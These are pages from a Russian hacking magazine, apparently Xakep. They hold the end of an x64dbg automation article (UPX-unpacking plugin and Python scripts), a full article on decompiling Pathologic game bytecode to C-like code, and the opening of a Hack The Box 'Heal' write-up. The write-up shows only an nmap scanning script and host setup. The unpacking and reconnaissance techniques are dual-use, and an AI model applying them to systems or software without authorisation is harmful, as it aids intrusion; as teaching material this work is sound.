{
    Script::Debug::Wait();
    auto cip = Script::Register::GetCIP();


    if (Script::Memory::ReadByte(cip) == 0x60)
    {
        DbgCmdExecDirect("bc");
        DbgCmdExecDirect("bphwc");
        auto found = Script::Pattern::FindMem(cip, 0x1000, "83 EC ??
E9");


        if (found)
        {
            Script::Debug::SetBreakpoint(found + 3);
            Script::Debug::Run();
            Script::Debug::StepIn();
            Script::Comment::Set(Script::Register::GetCIP(), "OEP");
            Script::Gui::Message("Reached OEP. Use Scylla to dump
and restore imports!");
            DbgCmdExecDirect("scylla");
        }
        else
            Script::Gui::Message("Couldn't find OEP jump (83 EC ??
E9)...");
    }
    else
        Script::Gui::Message("Put EIP on a UPX entry point (0x60) to
continue...");


    return true;
}

Разберемся,   что   делает   код.   Функция   _plugin_registercommand
в pluginInit регистрирует новую команду, ее можно будет вызывать по име‐
ни прямо из консоли. Колбэк cbCommand срабатывает в этом случае.
   Сначала код проверяет, что байт по адресу EIP равен 0x60 — это простая
сигнатура, первый опкод в UPX pushad, который бинарно  представлен
как 0x60 .
   Дальше вызываются DbgCmdExecDirect — это прямое исполнение тексто‐
вых команд, как строчка для интерпретатора. Через него вызываются зна‐
комые нам команды для очищения списка брейк‑пойнтов. Далее Script::
Pattern::FindMem по шаблону 83 EC ?? E9 ищет адрес кода.


83EC 80        sub esp,FFFFFF80
E9 80F9F9FF    jmp loaddll_upx.OEP

Так выглядит искомый ассемблерный код, количество вычитаемых из ESP бай‐
тов заранее неизвестно, поэтому вместо 80 стоит ?? . Это последняя инструк‐
ция после распаковки, за ней следует переход на оригинальную точку входа.
   Когда получен нужный адрес, на него ставится точка останова. А поймав
ее, код  проходит на один шаг  вперед. Здесь  ставится  комментарий
на текущий EIP, после чего вызывается scylla — встроенный в x64dbg инс‐
трумент для дампинга (то есть «упаковки») распакованных в памяти процесса
файлов обратно в EXE.
   Настало время проверить плагин в деле. Собираю исходный код, меняю
имя выходного файла на unpack_upx.dp32 и помещаю его в папку x64dbg\
x32\plugins . Запускаю отладчик и вижу в логе:



  [pluginload] unpack_upx
  [PLUGIN, unpack_upx] Command "unpack_upx" registered!
  [PLUGIN] unpack_upx v1 Loaded!


Значит, плагин загружен. Перехожу на точку входа в запакованном UPX файле
и ввожу команду unpack_upx . Моментально вижу сообщение об успешной
распаковке и запуске инструмента scylla. Все работает!


АВТОМАТИЗАЦИЯ НА PYTHON

Плагин x64dbgpy появился как проект стороннего разработчика, но сейчас
его поддерживает mrexodia — один из авторов x64dbg. Как ты уже догадался,
плагин добавляет поддержку скриптов на языке Python. Для работы плагина
нужно установить в систему Python 2.7.10. Внешний (не встроенный в тело
плагина)  интерпретатор  позволяет  устанавливать  сторонние  библиотеки
через pip, чем значительно расширяет возможности наших скриптов. Вдруг,
например, по ходу отладки потребуется экзотическая криптография, парсер
редкого формата или другой декомпилятор?


             INFO

                          Поддержка Python — признак  крутого проекта.
                         Надеюсь, в остальных  инструментах она тоже
                     однажды появится.


После установки плагина выбираем в меню Plugins → x64dbgpy → Open GUI
Script и загружаем готовый скрипт с диска. А отдельные команды можно
исполнять из консоли. Для этого справа от строки ввода в выпадающем спис‐
ке меняем Default на Python.
   Рассмотрим пример скрипта, реализующего распаковку UPX:


from x64dbgpy.pluginsdk import *
import sys


cip = register.GetCIP()
if memory.ReadByte(cip) != 0x60:
    gui.Message("Start at UPX entry point (1:[CIP]==0x60)")
    exit(0)


x64dbg.DbgCmdExecDirect("bc")
x64dbg.DbgCmdExecDirect("bphwc")
found = pattern.FindMem(cip, 0x1000, "83 EC ?? E9");
if found == 0:
    gui.Message("Could not find pattern!");
    exit(0)


debug.SetBreakpoint(found + 3)
debug.Run()
debug.StepIn()


cip = register.GetCIP()
comment.Set(cip, "OEP Found by Python!")
gui.Message("Reached OEP. Use Scylla to dump and restore imports!")
x64dbg.DbgCmdExec("scylla")

В глаза бросается схожесть происходящего с кодом плагина. И это неспрос‐
та — вызываемые из Python функции — это не более чем обертки над Plugin
SDK API. Поэтому имена функций на Python практически полностью повторя‐
ют имена из инклудов для C++.
   Нормальной документации к плагину нет, но есть неплохая шпаргалка
с примерами.


ВНЕШНЯЯ АВТОМАТИЗАЦИЯ

До  этого момента управление отладчиком  осуществлялось изнутри: он
выполнял загружаемые скрипты. Это удобно для полуавтоматического ана‐
лиза или распаковки конкретного файла. Но что, если таких файлов сотни?
Тут пригодится внешний инструмент, который создает инстансы отладчика
и управляет ими извне. Именно для этого был создан x64dbg-automate .
   Инструмент состоит из двух частей: библиотеки на Python в роли сервера
и плагина для x64dbg, выступающего в роли клиента. Для установки копируем
плагин в папку отладчика и ставим управляющую плагином библиотеку через
pip:


pip install x64dbg_automate --upgrade

В отличие от прошлого плагина, x64dbg-automate поддерживает актуальный
Python третьей версии, что значительно расширяет список доступных нам
библиотек.
   Набор API здесь свой, но это все так же лишь удобная обертка для Plugin
SDK. Названия методов API на этот раз не совпадают с Plugin SDK, но по ним
есть полноценная документация .
   Давай рассмотрим вот такой скрипт:


from x64dbg_automate import X64DbgClient
client = X64DbgClient(x64dbg_path=r"C:\Soft\x64dbg\x64\x64dbg.exe")
client.start_session(r'c:\Windows\System32\winver.exe')


mem = client.virt_alloc()
client.write_memory(mem, 'Xakep.RU'.encode('utf-16le'))


client.set_breakpoint('ShellAboutW', singleshoot=True)
client.go() # Entrypoint breakpoint
client.wait_until_stopped()
client.go() # ShellAboutW
client.wait_until_stopped()


client.set_reg('rdx', mem)
client.go()


client.detach_session()

Сначала создается дебаг‑сессия — с указанием пути до отладчика и отла‐
живаемого файла. В этот момент запускается дебаггер. Дальше через внут‐
ренние API в памяти процесса выделяется блок памяти и в нее записывается
строка в кодировке UTF-16. Мы ставим одноразовую точку останова на вход
в ShellAboutW . Ждем, пока отладчик до нее доберется, и меняем регистр
RDX. По соглашению о вызовах в x64-коде второй аргумент для WinAPI
передается через RDX. Поэтому, подставив в него адрес строки, мы на лету
подменяем заголовок окна.





                           Результат выполнения скрипта

Судя по постам автора плагина (darbonzo), x64dbg-automate создавался
с прицелом на анализ малвари. Действительно, внешние скрипты позволяют
анализировать тысячи семплов за раз. А управление отладчиком через Plugin
SDK предоставляет возможность автоматизировать распаковку, обход анти‐
отладки и даже  сравнение  сигнатур в памяти  распакованного  семпла
при помощи такого движка, как YARA.


ВЫВОДЫ

Автоматизация отладки позволяет делать с отладчиком буквально все то же
самое, что с ним можно делать при ручном управлении. И это немало! Фак‐
тически мы  получаем  кастомизируемый  инструмент  для  исследования
исполняемых файлов и автоматизации любых операций над ними. В сле‐
дующих статьях я покажу, как автоматизировать другие популярные инстру‐
менты, так что до скорого!
ВЗЛОМ





Это рассказ о том, как я сделал деком‐
пилятор вроде Hex-Rays для экзотического
языка  программирования,  используемого
для скриптов игры «Мор (Утопия)». Ты узна‐
ешь,   как   работает   кросс‑компиляция,          mr.grogrig@gmail.commr.grogrig
и получишь необходимый  теоретический
минимум из теории компиляции, который
поможет тебе сделать так же.


             INFO

                        Полный код моих скриптов и результат работы
                          декомпилятора ищи на GitHub .



ПАРА СЛОВ О ДЕКОМПИЛЯЦИИ

Мы будем работать с ассемблерным кодом, полученным в статье « Мод (Уто‐
пия) ». Он представляет собой набор из 89 опкодов. Фактически у нас есть
только набор команд и заголовки файла.
   Декомпиляция на язык более высокого уровня на самом деле является
кросс‑компиляцией. То есть мы пишем компилятор, который принимает
на вход исходный код на одном языке и превращает его в код на другом.
Для этого мы создадим граф исполнения оригинального кода и напишем
простенький эмулятор для стековой машины. Но обо всем по порядку.
В написании декомпилятора мне сильно помог опыт работы с Angr, о котором
я тоже уже писал статью . Фактически я повторил типовые решения, исполь‐
зуемые в компиляторах и анализаторах кода, и это сработало! Спасибо
теории компиляции.


ГРАФ ПОТОКА УПРАВЛЕНИЯ

Первый шаг анализа любого кода — разбить его на базовые блоки, то есть
набор  инструкций, который обрывается командой передачи управления.
Затем из базовых блоков можно построить граф, отразив связи: кто и кому
передает управление.





                    Знакомый многим граф в IDA Pro

Из картинки  видно, что есть  блоки, которые  кончаются командами, не
передающими управление. Это связано с тем, что следующий за ними
участок кода используется как адреса перехода. То есть другой код (обычно
цикл) передает управление в середину базового блока. В таком случае блок
делится на два так, чтобы второй начинался с адреса, на который могут
передать управление.
   Поэтому первым делом я прохожу по всему коду и запоминаю адреса
переходов. Будь это команда CALL или JMP — записываем, куда они передают
управление. После этого можно делить код на базовые блоки. Проходим
от первой инструкции до последней, разделяя их по известным адресам
перехода. Для этого я ввел специальные поля в классе самой инструкции:
метаданные, хранящие адреса и тип перехода — условный или безусловный.
   Разделив код на базовые блоки (создав массив объектов BasicNode),
можно приступать к их связыванию, то есть установке ссылок — на какой блок
передает  управление  исследуемый.  Каждый  базовый  блок  содержит
информацию о своем адресе (адресе первой входящей в него инструкции)
и об адресах перехода, которые известны последней инструкции.
  Граф должен иметь вершину — первую инструкцию, с которой начинается
поток управления. Заголовки из ассемблерного файла дают список воз‐
можных точек входа. Я запускаю рекурсивный анализ от первого базового
блока, после чего алгоритм проходит по всем адресам перехода и добавляет
к блоку ссылки на «дочерние».
  При этом каждый блок я прохожу лишь единожды. Существует глобальный
список seen — адреса блоков, которые алгоритм уже видел. При повторном
анализе они будут проигнорированы. Это позволяет быстро анализировать
рекурсивный граф, в котором могут быть вложенные циклы.
   Когда все ссылки на «дочерние» блоки расставлены, граф готов. Это ана‐
лог абстрактного синтаксического древа (AST). Дальше мы будем работать
только с ним.


ОБРАБОТКА ФУНКЦИЙ

Проприетарный язык игры поддерживает аналог команд CALL и RET из обыч‐
ного ассемблера x86. Однако тут нет никаких соглашений о вызовах вроде
stdcall . Установить число переменных, передаваемых как аргументы фун‐
кции, невозможно без полноценной эмуляции местного стека.
   Поэтому я не стал выделять начала функций как отдельные вершины гра‐
фа. Каждый вызов значится как обычная передача управления, а тело вызыва‐
емой функции — часть тела вызывающей. Этот трюк позволяет анализировать
функцию в контексте вызывающего ее кода. После первичного анализа фун‐
кцию можно выделить в отдельный граф.


ПРИМЕР ПОСТРОЕНИЯ ГРАФА

Я решил показать все этапы анализа на примере небольшого файла fire.
bin. Вот как выглядит его ассемблерный код:


RunOp = 0x6
RunTask = 1


GlobalTasks:
    GTASK_0  Params = 0
        EVENT_5 Op = 0x3 Vars = ()
    GTASK_1  Params = 0
        EVENT_6 Op = 0x26 Vars = ()


0x0: @ Hold()
0x1: Pop(0)
0x2: Return(); Pop(0)


0x3: @ StopGroup0()
0x4: Pop(0)
0x5: Return(); Pop(0)


0x6: PushEmpty(object, object)
0x7: PushEmpty(bool)
0x8: Call 0x2c


0x9: Pop(0)
0xa: Pop(1); Push((bool) Stack[-1] == 0)
0xb: IF (Stack[-1] == 0) GOTO 0x11; Pop(1)


0xc: PushEmpty()
0xd: Push(-0, 0); TaskCall(0)
0xe: Call 0x0


0xf: Pop(-0, 0); TaskReturn
0x10: Pop(0)
0x11: Push("fire")
0x12: @ FindParticleSystem(Stack[-1], Stack[-2])
0x13: Pop(1)
0x14: Pop(0); Push((bool) Stack[-1] == 0)
0x15: IF (Stack[-1] == 0) GOTO 0x1a; Pop(1)


0x16: Push("Can't find fire particle system")
0x17: @ Trace(Stack[-1])
0x18: Pop(1)
0x19: Return(); Pop(2)


0x1a: Push(CVector(0.0, 0.0, 0.0))
0x1b: Push(CVector(0.0, 1.0, 0.0))
0x1c: Push((float)0.0)
0x1d: @@ AddSource(Stack[-3], Stack[-2], Stack[-1])
0x1e: Pop(3)
0x1f: @@ Enable()
0x20: Pop(0)
0x21: @ Hold()
0x22: Pop(0)
0x23: GOTO 0x21


0x24: Return(); Pop(2)


0x25: Stack[-1] = 0
0x26: PushEmpty()
0x27: Push(-0, 0); TaskCall(0)
0x28: Call 0x0


0x29: Pop(-0, 0); TaskReturn
0x2a: Pop(0)
0x2b: Return(); Pop(0)


0x2c: PushEmpty(bool, bool)
0x2d: @ IsLoaded(Stack[-1])
0x2e: Pop(0)
0x2f: Stack[-3] = Stack[-1]
0x30: Return(); Pop(2)

Из заголовков видно, что тут есть три точки входа: 0x3, 0x6 и 0x26 . Пройдя
по коду, замечаем два адреса, на которые передается управление через
Call , — 0x0 и 0x2C . Это вершины функций. Так выглядит первичный граф:


0x3: @ StopGroup0()
0x4: Pop( 0 )
0x5: Return(); Pop( 0 )



0x26: PushEmpty()
0x27: Push(-0, 0 ); TaskCall( 0 )
0x28: Call 0x0


    0x0: @ Hold()
    0x1: Pop( 0 )
    0x2: Return(); Pop( 0 )


    0x29: Pop(-0, 0 ); TaskReturn
    0x2a: Pop( 0 )
    0x2b: Return(); Pop( 0 )


0x6: PushEmpty(object, object)
0x7: PushEmpty( bool)
0x8: Call 0x2c


    0x2c: PushEmpty(bool, bool)
    0x2d: @ IsLoaded(Stack[-1])
    0x2e: Pop( 0 )
    0x2f: Stack[-3] = Stack[-1]
    0x30: Return(); Pop( 2 )


    0x9: Pop( 0 )
    0xa: Pop( 1 ); Push (( bool) Stack[-1] == 0)
    0xb: IF (Stack[-1] == 0) GOTO 0x11; Pop( 1 )


        0xc: PushEmpty()
        0xd: Push(-0, 0 ); TaskCall( 0 )
        0xe: Call 0x0


            0x0: @ Hold()
            0x1: Pop( 0 )
            0x2: Return(); Pop( 0 )


            0xf: Pop(-0, 0 ); TaskReturn
            0x10: Pop( 0 )


                0x11: Push("fire")
                0x12: @ FindParticleSystem(Stack[-1], Stack[-2])
                0x13: Pop( 1 )
                0x14: Pop( 0 ); Push (( bool) Stack[-1] == 0)
                0x15: IF (Stack[-1] == 0) GOTO 0x1a; Pop( 1 )


                    0x16: Push("Can't find fire particle system")
                    0x17: @ Trace(Stack[-1])
                    0x18: Pop( 1 )
                    0x19: Return(); Pop( 2 )
                    0x1a: Push(CVector(0.0, 0.0, 0.0))
                    0x1b: Push(CVector(0.0, 1.0, 0.0))
                    0x1c: Push(( float ) 0.0 )
                    0x1d: @@ AddSource(Stack[-3], Stack[-2], Stack[-
1])
                    0x1e: Pop( 3 )
                    0x1f: @@ Enable()
                    0x20: Pop( 0 )


                        0x21: @ Hold()
                        0x22: Pop( 0 )
                        0x23: GOTO 0x21

Для каждой точки входа граф строится отдельно, то есть их тут три штуки.
Отступ слева обозначает начало дочернего блока.
   У блока по адресу 0x26 есть два «ребенка»: вызов функции по адресу 0x0
и следующая по номеру инструкция 0x29 . В первоначальном графе тело
вызываемой функции прикреплено к «родительскому» блоку, но только один
раз на граф.
   Блок по адресу 0x9 содержит два дочерних блока: следующий по номеру
0xc и переход на 0x11 . Из‑за этого перехода блок (внутри которого нет
команд передачи управления) по адресу 0xf делится на два. При этом блок
по адресу 0x11 одновременно является «ребенком» для блока 0xf, как сле‐
дующий за ним по номеру. Но так как мы придерживаемся правила «не
заходить в один блок дважды», граф будет отображаться с таким причуд‐
ливым порядком вложенности.


СИМУЛЯТОР СТЕКА

Основная проблема декомпилированного кода — относительные адреса
в стеке. К переменной обращаются через индекс от конца стека, и добав‐
ление новой переменной в конец стека ломает старые ссылки. Единственный
способ понять, какая переменная где используется, — пройти по графу
исполнения, симулируя все операции над стеком.
  Для этого мне пришлось улучшить декомпилятор ассемблерного кода: я
добавил каждой инструкции информацию о том, сколько переменных она
достает из стека и какого типа переменные в стек помещает.


class CInstructionPop:
    def __init__(self, r):
        self.OpCode = 'Pop'
        self.VarIn = r.uint32()
        self.PopCount = self.VarIn


    def __repr__(self):
        return f'Pop({self.VarIn})'


class CInstructionAdd:
    def __init__(self, r):
        self.OpCode = 'Add'
        self.Var1 = r.uint32()
        self.Var2 = r.uint32()
        self.TaskVar = r.int8() # signed
        self.PopCount = self.TaskVar & 0x3F
        self.PushType = [VAR_TYPE.INT]


    def __repr__(self):
        if self.TaskVar >= 0:
            var_1 = f'Stack[-{self.Var1}]'
        else:
            var_1 = f'Stack[{self.Var1} + StackPtr]'


        if self.TaskVar & 0x40:
            var_2 = f'Stack[{self.Var2} + StackPtr]'
        else:
            var_2 = f'Stack[-{self.Var2}]'


        return f'Pop({self.PopCount}); Push({var_1} + {var_2});'

Симулятор стека идет от вершины графа. Каждая инструкция добавляет
или убирает из стека значения. Хитрость в том, что мы делаем два снимка
стека для каждой инструкции — до выполнения опкода и после. И добавляем
их как метаданные в тело инструкции. На следующем этапе анализа снимки
стека помогут определить, какая переменная используется в инструкции.


0x6: PushEmpty(object, object)
>before: []
>after: [var_0_object, var_1_object]


0x7: PushEmpty( bool)
>before: [var_0_object, var_1_object]
>after: [var_0_object, var_1_object, var_2_bool]

Например, в самом начале функции 0x6 стек пустой, но первая команда
помещает в него две переменные типа object. Следующая инструкция
добавляет переменную типа bool .
   Симулятор стека помнит номер последней созданной переменной и при
помещении в стек новой выдает ей следующий порядковый номер. Простое
решение с глобальным счетчиком оказалось чрезвычайно плодотворным.
Каждая используемая переменная получила уникальный номер, а значит, ее
использование можно отслеживать!
   Перед входом в дочерний блок создается временная копия стека. Она
передается ему как актуальное состояние. Это нужно для того, чтобы первый
дочерний блок не смог повлиять на состояние стека во втором. Мы пользуем‐
ся трюком из Angr: при наличии условного перехода по очереди заходим
в каждую ветку. Таким образом мы посетим каждый блок ровно один раз, под‐
считав для каждого актуальное состояние стека.


0x8: Call 0x2c
>before: [var_0_object, var_1_object, var_2_bool]
>after: [var_0_object, var_1_object, var_2_bool]


    0x2c: PushEmpty(bool, bool)
    >before: [var_0_object, var_1_object, var_2_bool]
    >after: [var_0_object, var_1_object, var_2_bool, var_3_bool, var_
4_bool]

Вызов функции получает копию стека от вызывающего кода. Эта информация
пригодится, когда мы будем определять количество аргументов, переда‐
ваемых функции. Мы делаем предположение, что вызов функции не меняет
состояния стека. К счастью, язык спроектирован так, что аргументы вызыва‐
емой функции подчищает вызывающий ее код, поэтому предположение ока‐
залось  верным.  Иначе  пришлось  бы  писать  полноценный  эмулятор
для вызываемого кода.


ПРОХОДЫ

Граф состоит из блоков, каждый блок содержит в себе ссылку на «дочерние»
блоки и список ассемблерных инструкций. Идея в том, что мы можем допол‐
нять инструкции информацией о коде на языке более высокого уровня. Дру‐
гими словами, для каждой инструкции низкого уровня должен быть свой
обработчик, который заменяет ее инструкцией более высокого уровня.


if isinstance(instr.opcode, CInstructionMovB):
    node.instructions[i].hl = HLInstructionMovB(instr)


if isinstance(instr.opcode, CInstructionPow):
    node.instructions[i].hl = HLInstructionPow(instr)


if isinstance(instr.opcode, CInstructionPop):
    node.instructions[i].hl = HLInstructionNop()




                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИВЗЛОМ
         MODOLOGIC
                   ДЕКОМПИЛИРУЕМ
          ПРОПРИЕТАРНЫЙ АССЕМБЛЕР
                         В СИ-КОД




Например, работа со стеком влияет на симулятор стека, но никак не должна
отображаться   в   си‑коде.   Поэтому   CInstructionPop   заменяется
HLInstructionNop — объектом  класса  инструкции NOP (No  OPeration)
высокого уровня, которая не будет учитываться при сборке текста си‑кода.
   Работа с графом реализована через набор «проходов», я позаимствовал
идею из архитектуры LLVM. Проход — это функция, которая итеративно при‐
меняется к каждому  блоку в графе, меняет его на ходу или собирает
информацию о коде. Также не забываем «отсоединить» вызываемые функции
в отдельные графы.
   Первый проход заменяет инструкции их аналогами на языке высокого
уровня. Но в нем есть несколько особых случаев.


if isinstance(instr.opcode, CInstructionJump):
    node.instructions[i].hl = HLInstructionJump(instr)
    self.insert_label_list.append(instr.opcode.VarIn)


if isinstance(instr.opcode, CInstructionJumpB):
    node.instructions[i].hl = HLInstructionJumpB(instr)
    self.insert_label_list.append(instr.opcode.VarIn)

Команды передачи управления внутри той же функции прыгают по конкрет‐
ному адресу. В си‑коде нет адресов, поэтому мы добавляем в код новую инс‐
трукцию — метку с уникальным номером. На очередном проходе собранная
информация о метках будет преобразована в новые инструкции.


def pass_InsertLabels(self, top_node):
    if hasattr(self, 'insert_label_list'):
        for i in self.insert_label_list:
            self.insert_label(i, top_node)
        self.insert_label_list = []

Отдельно хочу сказать о проходе, записывающем используемые перемен‐
ные:


def pass_RecordUsedVars(self, node):
    node.Created = []
    node.Used = []


    for i in node.instructions:
        if hasattr(i, 'hl'):


            if hasattr(i.hl, 'Created'):
                node.Created += i.hl.Created


            if hasattr(i.hl, 'Used'):
                node.Used += i.hl.Used


    node.Created = list(set(node.Created))
    node.Used = list(set(node.Used))

Внутри каждой инструкции высокого уровня собираются поля с метаданными:
какие переменные она использует и какие в ней были созданы.


class HLInstructionPush:
    def __init__(self, instr):
        opcode = instr.opcode
        stack = opcode.stack_snapshot_after
        stack_before = opcode.stack_snapshot_before


        self.VarIn = stack_before[-opcode.VarIn]
        self.VarOut = stack[-1]


        self.Used = [self.VarIn]
        self.Created = [self.VarOut]


    def __repr__(self):
        return f'{self.VarOut} = {self.VarIn};'

Исходная инструкция содержит индекс в стеке для используемой перемен‐
ной. Объединяем индекс с полученным ранее снимком стека и узнаем,
с какой именно переменной велась работа. Ну и записываем ее в метадан‐
ные.
  Для многих команд нужна информация из обоих снимков стека — до и
после исполнения инструкции. Потому что смещения, записанные в команде,
валидны только для старого снимка, а создаваемая командой выходная
переменная есть только в новом снимке.
   Метаданные из полей Created и Used используются для определения
входных аргументов функций:


def get_func_args(self, top_node):
    Created = []
    Used = []


    for node, i in list(parse_graph(top_node, [])):


        if hasattr(node, 'Created'):
            Created += node.Created
            Used += node.Used


    # Used, but not created
    Args = list(set(Used) - set(Created))
    Args.sort(key=lambda x: x.index)
    return Args

Собираем все созданные и используемые переменные внутри тела функции.
И вычитаем созданные переменные из используемых. Оставшиеся очевид‐
ным образом были переданы внешним кодом. Другим способом понять,
какие переменные из  стека  являются входными  аргументами  функции,
не представляется возможным.
   Отдельный проход добавляет пролог и эпилог каждой функции, то есть
инструкции, которые будут отрендерены в текст как func_44(var_2_bool){
... } . Оставшийся проход добавляет отступы для кода слева.
   Так выглядит распечатка финального древа:


task_0_event_5()
{
    StopGroup0(); // 0x3 Func
    return 0; // 0x5 Return
}


task_1_event_6()
{
    TaskCall(0); // 0x27 TaskCall
    func_0(); // 0x28 Call
    TaskReturn(); // 0x29 TaskReturn
    return 0; // 0x2b Return
}


main()
{
    var_0_object = Obj(); var_1_object = Obj(); // 0x6 PushV
    var_2_bool = 0; // 0x7 PushV
    func_44(var_2_bool); // 0x8 Call
    var_5_bool = var_2_bool == 0; // 0xa Not
    if(var_5_bool == 0) goto Label_17; // 0xb JumpB
    TaskCall(0); // 0xd TaskCall
    func_0(); // 0xe Call
    TaskReturn(); // 0xf TaskReturn


Label_17:
    var_6_string = "fire"; // 0x11 PushS
    FindParticleSystem(var_6_string, var_1_object); // 0x12 Func
    var_7_bool = var_1_object == 0; // 0x14 NullEq
    if(var_7_bool == 0) goto Label_26; // 0x15 JumpB
    var_8_string = "Can't find fire particle system"; // 0x16 PushS
    Trace(var_8_string); // 0x17 Func
    return 2; // 0x19 Return


Label_26:
    var_9_cvector = CVector(0.0, 0.0, 0.0); // 0x1a PushVec
    var_10_cvector = CVector(0.0, 1.0, 0.0); // 0x1b PushVec
    var_11_float = 0.0; // 0x1c PushF
    AddSource(var_9_cvector, var_10_cvector, var_11_float); // 0x1d
ObjFunc
    Enable(); // 0x1f ObjFunc


Label_33:
    Hold(); // 0x21 Func
    goto Label_33; // 0x23 Jump
}



func_0()
{
    Hold(); // 0x0 Func
    return 0; // 0x2 Return
}



func_44(var_2_bool)
{
    var_3_bool = 0; var_4_bool = 0; // 0x2c PushV
    IsLoaded(var_4_bool); // 0x2d Func
    var_2_bool = var_4_bool; // 0x2f Mov
    return 2; // 0x30 Return
}

В целях отладки я указываю в комментариях адрес и опкод оригинальной
ассемблерной инструкции. Ошибки декомпиляции возможны, но код выг‐
лядит  вполне  адекватным, по  крайней мере  указанные при  создании
переменных типы соответствуют тому, как переменные используются.


СЖАТИЕ КОДА

Декомпилировав подобным образом все скрипты, я отловил несколько оши‐
бок. Посмотрим на знакомый нам по прошлой статье скрипт item_milk.bin:


main()
{
    var_0_bool = 0; var_1_string = ""; var_2_float = 0; var_3_float =
0; var_4_float = 0; // 0x0 PushV
    var_1_string = "hunger"; // 0x1 MovS
    var_2_float = -0.17; // 0x2 MovF
    var_3_float = 0; // 0x3 MovI
    var_4_float = 1; // 0x4 MovI
    func_8(var_0_bool, var_1_string, var_2_float, var_3_float,
var_4_float); // 0x5 Call
    return 0; // 0x7 Return
}


func_8(var_0_bool, var_1_string, var_2_float, var_3_float,
var_4_float)
{
    var_5_bool = 0; var_6_float = 0; var_7_bool = 0; var_8_float = 0;
// 0x8 PushV
    HasProperty(var_1_string, var_7_bool); // 0x9 Func
    var_9_bool = var_7_bool == 0; // 0xb Not
    if(var_9_bool == 0) goto Label_15; // 0xc JumpB
    var_0_bool = 0; // 0xd MovB
    return 4; // 0xe Return


Label_15:
    GetProperty(var_1_string, var_8_float); // 0xf Func
    var_10_float = 0; var_11_float = 0; var_12_float = 0;
var_13_float = 0; // 0x11 PushV
    var_11_float = var_8_float + var_2_float; // 0x12 Add2
    var_12_float = var_3_float; // 0x13 Mov
    var_13_float = var_4_float; // 0x14 Mov
    func_27(var_10_float, var_11_float, var_12_float, var_13_float);
// 0x15 Call
    SetProperty(var_1_string, var_10_float); // 0x17 Func
    var_0_bool = 1; // 0x19 MovB
    return 4; // 0x1a Return
}


func_27(var_10_float, var_11_float, var_12_float, var_13_float)
{
    var_14_bool = var_11_float < var_12_float; // 0x1c LT
    if(var_14_bool == 0) goto Label_32; // 0x1d JumpB
    var_10_float = var_12_float; // 0x1e Mov
    return 0; // 0x1f Return


Label_32:
    var_15_bool = var_11_float > var_13_float; // 0x20 GT
    if(var_15_bool == 0) goto Label_36; // 0x21 JumpB
    var_10_float = var_13_float; // 0x22 Mov
    return 0; // 0x23 Return


Label_36:
    var_10_float = var_11_float; // 0x24 Mov
    return 0; // 0x25 Return
}

Функции получают имена по адресам первой инструкции. В оригинальном
коде у них были осмысленные имена, но они потерялись при компиляции.
Процесс восстановления скрипта напоминает работу в IDA Pro: аналитик
добавляет имена переменных и функций. Видимо, по‑другому декомпиляцию
не провести.


main()
{
    var_0_bool = 0;
    func_8(var_0_bool, "hunger", -0.17, 0, 1);
    return;
}


func_8(var_0_bool, var_1_string, var_2_float, var_3_float,
var_4_float)
{
    var_7_bool = 0; var_8_float = 0;
    HasProperty(var_1_string, var_7_bool);
    if(var_7_bool != 0) goto Label_15;
    var_0_bool = 0;
    return;


Label_15:
    GetProperty(var_1_string, var_8_float);
    var_10_float = 0;
    func_27(var_10_float, var_8_float + var_2_float, var_3_float,
var_4_float);
    SetProperty(var_1_string, var_10_float);
    var_0_bool = 1;
    return;
}


func_27(var_10_float, var_11_float, var_12_float, var_13_float)
{
    if(var_11_float >= var_12_float) goto Label_32;
    var_10_float = var_12_float;
    return;


Label_32:
    if(var_11_float <= var_13_float) goto Label_36;
    var_10_float = var_13_float;
    return;


Label_36:
    var_10_float = var_11_float;
    return;
}

Код можно значительно упростить, подставляя определения переменных в те
места, где они используются. Это несложно автоматизировать через RD-ана‐
лиз, но проблема в том, что у меня нет определений используемых API вроде
SetProperty . Без прототипов функций невозможно сказать, какие аргументы
функция использует по значению, а какие по ссылке. Например, HasProperty
принимает первый строковый аргумент как значение, а во второй записывает
возвращаемое значение по ссылке. Но сжатие кода — это уже на будущее.


ВЫВОДЫ

Написать кросс‑компилятор оказалось сложной, но вполне посильной зате‐
ей. Следующим шагом может стать обратная задача — создание компилято‐
ра,  переводящего  си‑код  в  ассемблерный  байт‑код.  Декомпиляция
неидеальна, но мы уже получили тонну скриптов, пригодных для датамайнин‐
га.
ВЗЛОМ





Сегодня я покажу, как эксплуатировать уяз‐
вимость локального включения файлов (LFI)
в проекте на Ruby on Rails. Также исполь‐
зуем RCE-уязвимость в LimeSurvey, а после
                                                                                         RalfHacker
                                                                                             hackerralf8@gmail.comполучения  сессии  на  сервере повысим
свои привилегии через баг в API системы
Consul.


Наша конечная цель — получение прав суперпользователя на машине Heal
с учебной площадки Hack The Box . Уровень сложности задания — средний.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                        с применением средств анонимизации и  вир‐
                          туализации. Не делай этого с компьютеров, где
                         есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts :


10.10.11.46    heal.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '
 ' ',' | sed s/, $// )
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A ).





                             Результат работы скрипта

Сканер нашел два открытых порта:
 • 22 — служба OpenSSH 8.9p1;
 • 80 — веб‑сервер Nginx 1.18.0.

На SSH делать пока нечего, поэтому начинаем с веб‑сервера.





                           Главная страница сайта


ТОЧКА ВХОДА

На самом сайте ничего интересного не находим. Зато, изучая историю зап‐
росов в Burp History , видим обращения к API на домене api.heal.htb.





                         Запросы в Burp History

Обновляем запись в файле /etc/hosts и просматриваем найденный сайт.
Там нас ожидает Rails 7.1.4.


10.10.11.46 heal.htb api.heal.htb





                        Главная страница api.heal.htb

Теперь,  когда api.heal.htb доступен, возвращаемся и регистрируемся
на основном сайте.
   После авторизации получим редирект на страницу /resume, где предлага‐
ется отправить персональную информацию.





                     Содержимое страницы /resume

В меню сайта есть еще две ссылки. Пункт Survey ведет на новый поддомен
take-survey .





